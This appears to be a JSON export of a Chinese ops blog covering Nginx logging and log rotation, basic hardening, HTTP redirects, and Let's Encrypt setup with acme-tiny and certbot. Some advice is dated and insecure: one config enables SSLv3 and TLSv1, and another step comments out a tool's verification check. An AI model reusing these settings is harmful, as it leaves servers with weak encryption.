如果想关闭日志可以如下 access_log off; 2、错误日志错误日志主要记录客户端访问Nginx出错时的日志格式，不支持自定义。由指令error_log来指定具体格式如下 1error_log path(存放路径) level(日志等级)【debug | info | notice | warn | error |crit】 如果不指定路径的话默认是在logs下。 3.生产环境下常用的日志格式：12log_format main '$http_host-$http_x_forwarded_for $&#123;request_time&#125;s- [$time_local] \"$request\"' '$status $body_bytes_sent\"$http_referer\" \"$http_user_agent\" $remote_addr ' ; 二、日志管理1.nginx日志切割 实现思路：每天定时把日志移动到备份目录，然后重新reload或者restart。这样会在原来的logs下生成新的日志文件。(提示：当日志文件被移动到备份目录后，在没有restart的之前，nginx依然会向原来的日志文件中记录访问请求，只有等restart的之后生成了新文件，才重新记录到新的日志文件中)实现脚本： 123456789101112131415161718192021222324#!/bin/bash#created by yangc #Log DirDIR_LOG=\"/var/log/nginx/\"weblog=(weixin1.ihaozhuo.com)DATE=`date -d\"yesterday\" +\"%Y%m%d\"` if [ ! -d\"$&#123;DIR_LOG&#125;/cut_log/$&#123;DATE&#125;\" ];then mkdir -p $&#123;DIR_LOG&#125;/cut_log/$&#123;DATE&#125;fiDIR=\"$&#123;DIR_LOG&#125;/cut_log/$&#123;DATE&#125;\" NGINX_LOG=\"$&#123;DIR_LOG&#125;/current\" for log in $&#123;weblog[@]&#125;; domv $&#123;NGINX_LOG&#125;/$log $DIRdone kill -USR1 `cat /usr/local/nginx/logs/nginx.pid`sleep 130find $&#123;DIR_LOG&#125;/cut_log/* -typed -mtime +7 -exec rm -rf &#123;&#125; \\;sleep 130 2.nginx不记录某些文件或目录的访问日志方法：先用location 定义不记录日志的文件或目录，然后在其下面用 access_log off; 进行关闭日志即可例如： 123location ~*.\\checkstatus.html &#123; access_logoff;&#125;","link":"/2016/03/29/Web服务技术/Nginx/nginx基础篇-日志管理和切割/"},{"title":"确保Nginx安全的几个技巧","text":"在配置文件中设置自定义缓存以限制缓冲区溢出攻击的可能性 1234client_body_buffer_size 1K;client_header_buffer_size 1k;client_max_body_size 1k;large_client_header_buffers 2 1k; 将timeout设低来防止DOS攻击所有这些声明都可以放到主配置文件中。 1234client_body_timeout 10;client_header_timeout 10;keepalive_timeout 5 5;send_timeout 10; 限制用户连接数来预防DOS攻击 12limit_zone slimits $binary_remote_addr 5m;limit_conn slimits 5; 个人觉得在防止DDOS攻击这方面，设置这些没太大用处，特别是第三点，很扰乱用户体验度的。","link":"/2016/03/27/Web服务技术/Nginx/确保nginx安全的几个技巧/"},{"title":"Http response code 301 和 302分析总结","text":"http response code 301 和 302 了解多少呢。一．官方说法最近Nginx访问出现301和302这里就对301 302认真做了一次总结。 123301，302 都是HTTP状态的编码，都代表着某个URL发生了转移，不同之处在于： 301 redirect: 301 代表永久性转移(Permanently Moved)。302 redirect: 302 代表暂时性转移(Temporarily Moved )。 这是很官方的说法，那么它们的区别到底是什么呢？ 二．现实中的差异 对于用户301，302对用户来说没有区别，他们看到效果只是一个跳转，浏览器中旧的URL变成了新的URL。页面跳到了这个新的url指向的地方。 对于引擎及站长 302 302转向可能会有URL规范化及网址劫持的问题。可能被搜索引擎判为可疑转向，甚至认为是作弊。网址规范化 请参见：网址劫持 302重定向和网址劫持（URL hijacking）有什么关系呢？这要从搜索引擎如何处理302转向说起。 从定义来说，从网址A做一个302重定向到网址B时，主机服务器的隐含意思是网址A随时有可能改主意，重新显示本身的内容或转向其他的地方。大部分的搜索引擎在大部分情况下，当收到302重定向时，一般只要去抓取目标网址就可以了，也就是说网址B。实际上如果搜索引擎在遇到302转向时，百分之百的都抓取目标网址B的话，就不用担心网址URL劫持了。问题就在于，有的时候搜索引擎，尤其是Google，并不能总是抓取目标网址。为什么呢？比如说，有的时候A网址很短，但是它做了一个302重定向到B网址，而B网址是一个很长的乱七八糟的URL网址，甚至还有可能包含一些问号之类的参数。很自然的，A网址更加用户友好，而B网址既难看，又不用户友好。这时Google很有可能会仍然显示网址A。由于搜索引擎排名算法只是程序而不是人，在遇到302重定向的时候，并不能像人一样的去准确判定哪一个网址更适当，这就造成了网址URL劫持的可能性。也就是说，一个不道德的人在他自己的网址A做一个302重定向到你的网址B，出于某种原因， Google搜索结果所显示的仍然是网址A，但是所用的网页内容却是你的网址B上的内容，这种情况就叫做网址URL劫持。你辛辛苦苦所写的内容就这样被别人偷走了。 301 当网页A用301重定向转到网页B时，搜索引擎可以肯定网页A永久的改变位置，或者说实际上不存在了，搜索引擎就会把网页B当作唯一有效目标。301的好处是: 12第一， 没有网址规范化问题。第二， 也很重要的，网页A的PR网页级别会传到网页B。 三．Apache中实现301、302 方法一，url rewrite，mod_rewrite [plain] 12345view plain copyRewriteengine on RewriteCond %&#123;HTTP_HOST&#125; ^cmp.soso.com [NC] RewriteRule ^/js/(.*) http://www.soso.com/js/$1 [R=301] ServerName cmp.soso.com 将cmp.soso.com中js目录的下所有访问重定向到http://www.soso.com/js/，指定跳转返回码为301。对于[R=301]的详解：‘redirect|R [=code]’ (强制重定向 redirect)以http://thishost[:thisport]/(使新的URL成为一个URI) 为前缀的Substitution可以强制性执行一个外部重定向。 如果code没有指定，则产生一个HTTP响应代码302(临时性移动)。 如果需要使用在300-400范围内的其他响应代码，只需在此指定这个数值即可， 另外，还可以使用下列符号名称之一: temp (默认的), permanent, seeother. 用它可以把规范化的URL反馈给客户端，如,重写``/~&#39;&#39;为 ``/u/&#39;&#39;，或对/u/user加上斜杠，等等。 注意: 在使用这个标记时，必须确保该替换字段是一个有效的URL! 否则，它会指向一个无效的位置! 并且要记住，此标记本身只是对URL加上 http://thishost[:thisport]/的前缀，`重写操作仍然会继续`。 通常，你会希望停止重写操作而立即重定向，则还需要使用’L’标记. 方法二 Redirect ，涉及模块：mod_alias 例： 123456[plain] view plain copy&lt;VirtualHost 10.1.146.163:80&gt; DocumentRoot /home/qmhball/web/mybranches/stat_3276/oa/ ServerName oalogin.com Redirect 301 /login.php http://www.soso.com &lt;/VirtualHost&gt; 将oalogin.com下对login.php的访问重定向到http://www.soso.com，返回码301。如果没有指定redirect的返回参数（例中的301），则默认重定向是”临时性的”(HTTP status 302)。","link":"/2016/04/02/Web服务技术/Nginx/http response code 301 和 302分析总结/"},{"title":"如何在Nginx申请安装配置免费HTTPS证书+阿里云SLB如何配置HTTPS","text":"如何在Nginx申请安装配置免费HTTPS证书HTTPS在各大互联网站已经成为标配，就连某度也在前不久全面启用HTTPS，很多小网站也配置了HTTPS，这是未来的一种趋势.HTTPS的好处多多，可以防止各种攻击劫持，运营商广告植入，客户传输信息泄露等问题。为了让HTTPS能够全面普及，让我们加密项目应运而生，它由互联网安全研究小组ISRG（互联网安全研究小组）提供服务，很早之前我就在关注 Let’s Encrypt这个免费、自动化、开放的证书签发服务。ISRG是来自美国加利福尼亚州的一个公益组织.Let’s Encrypt得到了Mozilla，Cisco和Chrome等众多公司和机构的支持。 申请 Let&#39;s Encrypt 证书不但免费，还非常简单，虽然每次只有 90 天的有效期，但可以通过脚本定期更新，配好之后一劳永逸。本教程亲测有效，希望对正在寻找免费HTTPS方案的你有一定的帮助，本文记录本站申请过程和遇到的问题。 按照我们的加密官方提供的工具安装HTTPS的话与过于复杂，于是有好心人提供了更为轻巧的工具安装，极致纤巧诞生了，它的代码量在200行内，只需依赖的Python和OpenSSL的。 第一步：创建Let’s Encrypt加密账号首先创建一个目录，例如 ssl用来存放各种临时文件和最后的证书文件。进入这个目录，创建一个RSA私钥用于 Let’s Encrypt 识别你的身份： 让我们加密使用一个私钥来进行账号的创建与登陆，因此我们需要使用openssl创建一个account.key 123456[root@ihaozhuo1 srv]# mkdir ssl &amp;&amp; cd ssl[root@ihaozhuo1 ssl]# openssl genrsa 4096 &gt; account.keyGenerating RSA private key, 4096 bit long modulus...........................++...........................++e is 65537 (0x10001) 第二步：创建域名的CSR（证书签名请求）让我们加密使用的ACME协议需要一个CSR文件，可以使用它来重新申请HTTPS证书，接下来我们就可以创建域名CSR，在创建CSR之前，我们需要给我们的域名创建一个私钥（这个和上面的账户私钥无关）。接着就可以生成 CSR（Certificate Signing Request，证书签名请求）文件了。在这之前，还需要创建域名私钥（一定不要使用上面的账户私钥），根据证书不同类型，域名私钥也可以选择 RSA 和 ECC 两种不同类型。以下两种方式请根据实际情况二选一。 1）创建 RSA 私钥（兼容性好）： 1openssl genrsa 4096 &gt; domain.key 2）注意：一定不要使用上面创建好的account.key 来当domain.key ❗️ 有了私钥文件，就可以创建生成 CSR文件了。在 CSR中推荐至少把域名带 www 和不带www的两种情况都加进去，其它子域可以根据需要添加,替换下面的ihaozhuo.com即可 (目前一张证书最多可以包含 100 个域名) 3）注意，稍后会说到，每个域名都会涉及到验证） 1234567＃单个域名openssl req -new -sha256 -key domain.key -subj“/CN=ihaozhuo.ccom”&gt; domain.csr＃多个域名（如果你有多个域名，比如：www.ihaozhuo.com 和ihaozhuo.com，使用这种方式）openssl req -new -sha256 -key domain.key -subj \"/\" -reqexts SAN -config &lt;(cat /etc/ssl/openssl.cnf &lt;(printf \"[SAN]\\nsubjectAltName=DNS:ihaozhuo.com,DNS:www.ihaozhuo.com\")) &gt; domain.csr 4）说明：ihaozhuo.com，www.ihaozhuo.com 替换成你的域名执行这一步时，需要指定openssl.cnf文件，一般这个文件在你的openssl安装目录底下。 如果提示找不到 /etc/ssl/openssl.cnf文件，请看看/usr/local/openssl/ssl/openssl.cnf 和/etc/pki/tls/openssl.cnf是否存在。 12345[root@ihaozhuo1 ssl]# find / -name openssl.cnf ##查找openssl.cnf文件/etc/pki/tls/openssl.cnf[root@ihaozhuo1 ssl]# ln -s /etc/pki/tls/openssl.cnf /etc/ssl/openssl.cnf #做个软链接 [root@ihaozhuo1 ssl]# openssl req -new -sha256 -key domain.key -subj \"/\" -reqexts SAN -config &lt;(cat /etc/ssl/openssl.cnf &lt;(printf \"[SAN]\\nsubjectAltName=DNS:ihaozhuo.com,DNS:www.ihaozhuo.com\")) &gt; domain.csr 如果还是不行，也可以使用交互方式创建CSR（需要注意 Common Name必须为你的域名）： 1openssl req -new -sha256 -key domain.key -out domain.csr 第三步：配置域名验证CA在签发DV（域验证）证书时，需要验证域名所有权。传统CA的验证方式一般是往admin@ihaozhuo.com发验验邮件，而让我们加密是在你的服务器上生成一个随机验证文件，再通过创建CSR时指定的域名访问，如果可以访问则表明你对这个域名有控制权。 首先创建用于存放验证文件的目录，例如： 1mkdir -p var/www/challenge 然后配置一个Nginx服务，以Nginx为例:(注意：这里的端口是80，不是443） 123456789101112131415server &#123; listen 80; server_name www.ihaozhuo.com ihaozhuo.com; location /.well-known/acme-challenge/ &#123; alias /var/www/challenges/; index index.html index.php index.jsp index.htm; try_files $uri =404;&#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; &#125;&#125; 这是我在上面配置完成以后需要重启Nginx，先Nginx -t校验下是否有没有问题。 123456789101112131415161718[root@ihaozhuo1 conf]# nginx -tnginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is oknginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful``` 如何验证上面设置是否成功？ 我们只要在目录：/var/www/challenges/ 下面创建文件：test.html然后通过http://www.ihaozhuo.com/.well-known/acme-challenge/test.html URL访问地址那个文件，如果能访问成功说明你配置没问题;否则就说明配置错误❌，这一步不能实现下面就不能成功了。以上配置优先查找 `var/www/challenge`目录下的文件，如果找不到就重定向到` HTTPS` 地址。这个验证服务以后更新证书还要用到，建议一直保留。### 第四步：获取网站证书**1）上面配置好，现在我们使用acme-tiny.py来获取网站证书** acme-tiny脚本文件上Github下载：[acme-tiny.py](https://github.com/diafygi/acme-tiny)**2）先把 acme-tiny 脚本保存到之前的ssl目录**```bashwget https://raw.githubusercontent.com/diafygi/acme-tiny/master/acme_tiny.py 3）然后指定账户私钥、CSR 以及验证目录，执行脚本来获取网站证书 1python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /var/www/challenges/ &gt; ./signed.crt 4）如果一切正常，当前目录下就会生成一个signed.crt这就是申请好的证书文件，如果跟我一样报错了请看下面 1234567891011121314[root@ihaozhuo1 ssl]# python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /var/www/challenges/ &gt; ./signed.crtParsing account key...Parsing CSR...Registering account...Already registered!Verifying ihaozhuo.com...Traceback (most recent call last): File \"acme_tiny.py\", line 198, in &lt;module&gt; main(sys.argv[1:]) File \"acme_tiny.py\", line 194, in main signed_crt = get_crt(args.account_key, args.csr, args.acme_dir, log=LOGGER, CA=args.ca) File \"acme_tiny.py\", line 123, in get_crt wellknown_path, wellknown_url))ValueError: Wrote file to /var/www/challenges/fWyC6BvCCSlVunoaltJrnEV-ewj6FBpOv7Eu8LluBUg, but couldn't download http://ihaozhuo.com/.well-known/acme-challenge/fWyC6BvCCSlVunoaltJrnEV-ewj6FBpOv7Eu8LluBUg 5）脚本问题： 记得在网站记得域名解析要对，都是你现在申请证书这台外网解析地址： http://ihaozhuo.com/不通那解析就出现问题了。 网上也有很多人说域名DNS服务器解析导致域名不行，这个验证了以后不是的，这个是GitHub这个脚本acme_tiny.py问题导致的，需要编辑脚本注释掉下面全部内容即可 116行-123行： 12345678# try: # resp = urlopen(wellknown_url) # resp_data = resp.read().decode('utf8').strip() # assert resp_data == keyauthorization # except (IOError, AssertionError): # os.remove(wellknown_path) # raise ValueError(\"Wrote file to &#123;0&#125;, but couldn't download &#123;1&#125;\".format( # wellknown_path, wellknown_url)) 如果修改没有用，可以到我这里下载Github下载acme_tiny.py 6）然后保存再次获取网站证书 1234567891011[root@ihaozhuo1 ssl]# python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /var/www/challenges/ &gt; ./signed.crtParsing account key...Parsing CSR...Registering account...Already registered!Verifying ihaozhuo.com...ihaozhuo.com verified!Verifying www.ihaozhuo.com...www.ihaozhuo.com verified!Signing certificate...Certificate signed! ㊗️ 如果看到如上内容，那么恭喜你，你的网站证书已经成功获取了。这时候查看目录下面有如下几个文件： 12345678[root@ihaozhuo1 ssl]# ll总用量 36-rw-r--r-- 1 root root 3243 3月 30 16:42 account.keydrwxr-xr-x 4 root root 4096 3月 30 17:31 acme-tiny-rw-r--r-- 1 root root 9159 3月 30 19:23 acme_tiny.py-rw-r--r-- 1 root root 1639 3月 30 17:00 domain.csr-rw-r--r-- 1 root root 3243 3月 30 16:53 domain.key-rw-r--r-- 1 root root 2159 3月 30 22:11 signed.crt 到目前为止我们已经成功申请到Let’sENcrpyt的网站证书，对于Nginx用户我们还需要把Let’s ENcrpyt的中间证书加入到刚刚生成的signed.crt文件中。具体操作： 第五步：安装证书证书生成后，就可以把它配置在web 服务器上了，需要注意的是，Nginx需要追加一个Let’s Encrypt的中间证书，在 Nginx 配置中，需要把中间证书和网站证书合在一起： 123456789101112wget -O - https://letsencrypt.org/certs/lets-encrypt-x1-cross-signed.pem &gt; intermediate.pemcat signed.crt intermediate.pem &gt; chained.pem[root@ihaozhuo1 ssl]# ll总用量 36-rw-r--r-- 1 root root 3243 3月 30 22:06 account.key-rw-r--r-- 1 root root 9159 3月 30 19:23 acme_tiny.py-rw-r--r-- 1 root root 3834 3月 30 22:51 chained.pem-rw-r--r-- 1 root root 1639 3月 30 22:07 domain.csr-rw-r--r-- 1 root root 3243 3月 30 22:06 domain.key-rw-r--r-- 1 root root 1675 3月 30 22:51 intermediate.pem-rw-r--r-- 1 root root 2159 3月 30 22:51 signed.crt 1）现在我们可以在Nginx启动HTTPS，你可以直接在你之前网站Nginx.conf里面配置 注意⚠️ ：为了不影响现在正在运行的网站，在配置HTTPS的时候最好将你现在配置好的文件全部备份起来，这样你在启动HTTPS出现问题可以能够快速恢复回来。 Nginx配置文件加入以下配置： 12345678910111213141516171819202122232425262728server &#123; listen 80; server_name ihaozhuo.com, www.ihaozhuo.com; location /.well-known/acme-challenge/ &#123; alias /var/www/challenges/; try_files $uri =404; &#125; ...the rest of your config&#125;server &#123; listen 443; server_name ihaozhuo.com, www.ihaozhuo.com; ssl on; ssl_certificate /srv/ssl/chained.pem; ssl_certificate_key /srv/ssl/domain.key; ssl_session_timeout 5m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA:ECDHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA; ssl_session_cache shared:SSL:50m; ssl_prefer_server_ciphers on; ...the rest of your config&#125; 在Chrome浏览器里面你可以访问https开头的，但没有看到绿色锁标记，这是因为你网站有请求http://xxx资源，这个问题我遇到以后查了很多，因为我网站很早之前就有了，里面配置的地址都是http要修改过来非常麻烦，所以申请证书一开始域名下来就要申请这是最好的，如果你情况已经跟我一样，那你需要把所有的http://xxxx 资源全部切换成：https://xxx 的资源，这样绿色的锁才会出现。 第六步：定期更新访问查看下网站详细信息： 1234567891011121314151617181920212223242526272829[root@ihaozhuo1 conf]# curl -v https://www.ihaozhuo.com/home.html* About to connect() to www.ihaozhuo.com port 443 (#0)* Trying 120.27.185.86...* Connected to www.ihaozhuo.com (120.27.185.86) port 443 (#0)* Initializing NSS with certpath: sql:/etc/pki/nssdb* CAfile: /etc/pki/tls/certs/ca-bundle.crt CApath: none* Server certificate:* subject: CN=ihaozhuo.com* start date: 3月 30 13:51:00 2017 GMT* expire date: 6月 28 13:51:00 2017 GMT* common name: ihaozhuo.com* issuer: CN=Let's Encrypt Authority X3,O=Let's Encrypt,C=US* NSS error -8179 (SEC_ERROR_UNKNOWN_ISSUER)* Peer's Certificate issuer is not recognized.* Closing connection 0curl: (60) Peer's Certificate issuer is not recognized.More details here: http://curl.haxx.se/docs/sslcerts.htmlcurl performs SSL certificate verification by default, using a \"bundle\" of Certificate Authority (CA) public keys (CA certs). If the default bundle file isn't adequate, you can specify an alternate file using the --cacert option.If this HTTPS server uses a certificate signed by a CA represented in the bundle, the certificate verification probably failed due to a problem with the certificate (it might be expired, or the name might not match the domain name in the URL).If you'd like to turn off curl's verification of the certificate, use the -k (or --insecure) option. Let’s Encrypt 签发的证书只有90天有效期，但可以通过脚本定期更新。你可以创建了一个自动更新脚本renew_cert.sh，内容如下： 123456#!/usr/bin/shpython /srv/ssl/acme_tiny.py --account-key /srv/ssl/account.key --csr /srv/ssl/domain.csr --acme-dir /var/www/challenges/ &gt; /srv/ssl/signed.crt || exitwget -O - https://letsencrypt.org/certs/lets-encrypt-x1-cross-signed.pem &gt; intermediate.pemcat /srv/ssl/signed.crt intermediate.pem &gt; /srv/ssl/chained.pemservice nginx reload 修改crontab配置，加入以下内容： 12#每个月执行一次0 0 1 * * /srv/ssl/renew_cert.sh 2&gt;&gt; /var/log/acme_tiny.log 大功告成，不过先别急，访问下自己的HTTPS网站是否正常，不出意外的话，网站正式启用HTTPS，但是网站如果有用CDN的话，那么需要CDN也支持HTTPS才行，否则无法正常加载CDN的资源，类似的错误如： 1Mixed Content: The page at 'https://ihaozhuo.com/' was loaded over HTTPS, but requested an insecure script 'http://app.h5.ihaozhuo.combdimg.com/yjk/css/jquery.min.js'. This request has been blocked; the content must be served over HTTPS. 一种解决方法就是使用Upyun来解决这个问题。可参考：我写的一篇文章如何解决https跨站访问证书不安全访问。 一种解决方法就是使用七牛的云存储来解决这个问题。可参考：https://blog.blahgeek.com/qiniu-cdn-serve-static/ 阿里云SLB如何配置HTTPS使用阿里云很简单，不需要太多的配置不过个人还是喜欢Nginx去做代理访问。 公司后期更新了本地的Nginx去做负载均衡直接使用SLB ，这里记录下申请了证书以后只需要chained.pem和私钥domain.key。 在SLB负载均衡左侧有证书管理-创建证书-选择服务器证书。 然后在负载均衡上面设置下监听端口选择下对应证书就可以了。 参考：GitHub 安装教程","link":"/2016/11/23/Web服务技术/申请证书Https/如何在Nginx申请安装配置免费HTTPS证书+阿里云SLB如何配置HTTPS/"},{"title":"免费 Https证书（Let'S Encrypt）申请与配置","text":"免费 Https 证书（Let’S Encrypt）申请与配置之前要申请免费的 https 证书操作步骤相当麻烦，今天看到有人在讨论，就搜索了一下。发现现在申请步骤简单多了。 1. 下载 certbot123git clone https://github.com/certbot/certbotcd certbot./certbot-auto --help 解压打开执行就会有相关提示 2. 生成免费证书12./certbot-auto certonly --webroot --agree-tos -v -t --email 邮箱地址 -w 网站根目录 -d 网站域名./certbot-auto certonly --webroot --agree-tos -v -t --email keeliizhou@gmail.com -w /path/to/your/web/root -d ihaozhuo.com 注意 这里 默认会自动生成 /网站根目录/.well-known/acme-challenge，然后 shell 脚本会对应的访问 网站域名/.well-known/acme-challenge 如果返回正常就确认了你对这个网站的所有权，就能顺利生成 3. 获取证书如果上面的步骤正常 shell 脚本会展示如下信息： 123- Congratulations! Your certificate and chain have been saved at/etc/letsencrypt/live/网站域名/fullchain.pem... 4. 生成 dhparams使用 openssl 工具生成 dhparams 1openssl dhparam -out /etc/ssl/certs/dhparams.pem 2048 5. 配置 Nginx打开 nginx server 配置文件加入如下设置： 12345678listen 443ssl on;ssl_certificate /etc/letsencrypt/live/网站域名/fullchain.pem;ssl_certificate_key /etc/letsencrypt/live/网站域名/privkey.pem;ssl_dhparam /etc/ssl/certs/dhparams.pem;ssl_protocols SSLv3 TLSv1 TLSv1.1 TLSv1.2;ssl_ciphers HIGH:!aNULL:!MD5; 然后重启 nginx 服务就可以了 6. 强制跳转 httpshttps 默认是监听 443 端口的，没开启 https 访问的话一般默认是 80 端口。如果你确定网站 80 端口上的站点都支持 https 的话加入下面的配件可以自动重定向到 https 12345server &#123; listen 80; server_name your.domain.com; return 301 https://$server_name$request_uri;&#125; 7. 证书更新免费证书只有 90 天的有效期，到时需要手动更新 renew。刚好 Let’s encrypt 旗下还有一个 Let’s monitor 免费服务，注册账号添加需要监控的域名，系统会在证书马上到期时发出提醒邮件，非常方便。收到邮件后去后台执行 renew 即可，如果提示成功就表示 renew 成功 1./certbot-auto renew","link":"/2016/11/24/Web服务技术/申请证书Https/免费 Https 证书（Let'S Encrypt）申请与配置 /"},{"title":"解决Https请求跨域CDN资源http网站出现访问失败-证书显示不安全","text":"解决Https请求跨域CDN资源http网站出现访问失败-证书显示不安全这里讲如何解决跨域http资源请求证书出现问题， 上一篇我解决网站如何申请免费证书，实现申请免费证书在Nginx上面实现https访问。 可是我一开始没有这么顺利实现我想要的效果，因为的确证书是有了访问可以https可是请求跨域http服务就出现问题了。这里我是在又拍云做CDN加速的，所以这里说明下如果你的公司网站比如说：ihaozhuo.com那么请求的时候https://ihaozhuo.com 出现我下面同样的问题: 这是我显示的错误图片当初截图留下记录成文档了。这里我也做了HTTPS安全检测：https://www.ssllabs.com/ssltest 如何解决：这里我问前端的代码静态资源上面请求upyun的http去访问，这里我们在upyun对请求域名设置https方法： upyun对应的服务列表设置里面选择https设置 配置好以后就可以生效了。 这里需要把地址给到前端让他们在代码上面修改下HTTPS 更新下服务重启就出现访问正常了。","link":"/2016/11/23/Web服务技术/申请证书Https/解决Https请求跨域CDN资源http网站出现访问失败-证书显示不安全/"}],"tags":[{"name":"Bigdata Hadoop","slug":"Bigdata-Hadoop","link":"/tags/Bigdata-Hadoop/"},{"name":"Ambari","slug":"Ambari","link":"/tags/Ambari/"},{"name":"Node.js","slug":"Node-js","link":"/tags/Node-js/"},{"name":"Grunt","slug":"Grunt","link":"/tags/Grunt/"},{"name":"OpenLDAP","slug":"OpenLDAP","link":"/tags/OpenLDAP/"},{"name":"Shell programming","slug":"Shell-programming","link":"/tags/Shell-programming/"},{"name":"Operation safety","slug":"Operation-safety","link":"/tags/Operation-safety/"},{"name":"Automation Deploy","slug":"Automation-Deploy","link":"/tags/Automation-Deploy/"},{"name":"Performance monitoring","slug":"Performance-monitoring","link":"/tags/Performance-monitoring/"},{"name":"CDN","slug":"CDN","link":"/tags/CDN/"},{"name":"Operation and maintenance Road","slug":"Operation-and-maintenance-Road","link":"/tags/Operation-and-maintenance-Road/"},{"name":"Kafka","slug":"Kafka","link":"/tags/Kafka/"},{"name":"Prometheus","slug":"Prometheus","link":"/tags/Prometheus/"},{"name":"Grafana","slug":"Grafana","link":"/tags/Grafana/"},{"name":"Zabbix","slug":"Zabbix","link":"/tags/Zabbix/"},{"name":"Rabbitmq","slug":"Rabbitmq","link":"/tags/Rabbitmq/"},{"name":"Countly","slug":"Countly","link":"/tags/Countly/"},{"name":"ZooKeeper","slug":"ZooKeeper","link":"/tags/ZooKeeper/"},{"name":"Smokeping","slug":"Smokeping","link":"/tags/Smokeping/"},{"name":"IDC监控","slug":"IDC监控","link":"/tags/IDC监控/"},{"name":"Zabbix monitoring","slug":"Zabbix-monitoring","link":"/tags/Zabbix-monitoring/"},{"name":"logstash","slug":"logstash","link":"/tags/logstash/"},{"name":"Cacti monitoring","slug":"Cacti-monitoring","link":"/tags/Cacti-monitoring/"},{"name":"Elasticsearch","slug":"Elasticsearch","link":"/tags/Elasticsearch/"},{"name":"Kibana","slug":"Kibana","link":"/tags/Kibana/"},{"name":"Log analysis platform","slug":"Log-analysis-platform","link":"/tags/Log-analysis-platform/"},{"name":"Graylog","slug":"Graylog","link":"/tags/Graylog/"},{"name":"Ansible","slug":"Ansible","link":"/tags/Ansible/"},{"name":"Jenkins","slug":"Jenkins","link":"/tags/Jenkins/"},{"name":"Manven","slug":"Manven","link":"/tags/Manven/"},{"name":"Phabricator","slug":"Phabricator","link":"/tags/Phabricator/"},{"name":"Saltstack","slug":"Saltstack","link":"/tags/Saltstack/"},{"name":"Java+Tomcat notes","slug":"Java-Tomcat-notes","link":"/tags/Java-Tomcat-notes/"},{"name":"performance tuning","slug":"performance-tuning","link":"/tags/performance-tuning/"},{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"Web Service","slug":"Web-Service","link":"/tags/Web-Service/"},{"name":"Nginx","slug":"Nginx","link":"/tags/Nginx/"}],"categories":[{"name":"Bigdata Hadoop","slug":"Bigdata-Hadoop","link":"/categories/Bigdata-Hadoop/"},{"name":"OpenLDAP","slug":"OpenLDAP","link":"/categories/OpenLDAP/"},{"name":"运维安全","slug":"运维安全","link":"/categories/运维安全/"},{"name":"运维笔记","slug":"运维笔记","link":"/categories/运维笔记/"},{"name":"Framework","slug":"Framework","link":"/categories/Framework/"},{"name":"automation","slug":"automation","link":"/categories/automation/"},{"name":"大数据","slug":"大数据","link":"/categories/大数据/"},{"name":"Kafka","slug":"Kafka","link":"/categories/Kafka/"},{"name":"Bigdata","slug":"Bigdata","link":"/categories/Bigdata/"},{"name":"monitoring","slug":"monitoring","link":"/categories/monitoring/"},{"name":"Log Analysis Platform","slug":"Log-Analysis-Platform","link":"/categories/Log-Analysis-Platform/"},{"name":"Automation","slug":"Automation","link":"/categories/Automation/"},{"name":"tomcat","slug":"tomcat","link":"/categories/tomcat/"},{"name":"Java","slug":"Java","link":"/categories/Java/"},{"name":"nginx","slug":"nginx","link":"/categories/nginx/"},{"name":"Nginx","slug":"Nginx","link":"/categories/Nginx/"}]}